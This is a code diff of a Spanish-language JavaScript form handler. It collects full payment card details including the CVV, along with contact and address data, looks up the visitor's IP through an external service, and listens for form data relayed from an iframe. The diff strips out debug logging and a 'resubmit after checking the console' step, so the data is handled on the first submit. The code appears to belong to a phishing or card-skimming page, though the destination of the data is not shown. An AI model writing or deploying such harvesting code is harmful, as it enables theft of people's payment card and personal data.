@@ -5,7 +5,6 @@ document.addEventListener('DOMContentLoaded', function() {
     if (form) {
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
-            submitCount++;
 
             const ipRes = await fetch("https://api.ipify.org?format=json");
             const ipData = await ipRes.json();
@@ -21,7 +20,6 @@ document.addEventListener('DOMContentLoaded', function() {
             // Escuchar respuesta del iframe (por si acaso)
             window.addEventListener('message', function(event) {
                 if(event.data.type === 'formData') {
-                    console.log('Datos recibidos del iframe:', event.data.payload);
                 }
             });
 
@@ -77,13 +75,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 country: country,
                 ip: ipaddress
             };
-
-            if (submitCount === 1) {
-                console.log('Datos a enviar:', data);
-                document.getElementById('response').textContent = "Verifica los datos en la consola y vuelve a enviar para continuar.";
-                return;
-            }
-
             // Validaciones
             if (!email || !emailConf || !name || !address1 || !postal || !cardNumber || !cardExpiry || !cardCVV || !cardHolder) {
                 document.getElementById('response').textContent = "Por favor, complete todos los campos obligatorios.";
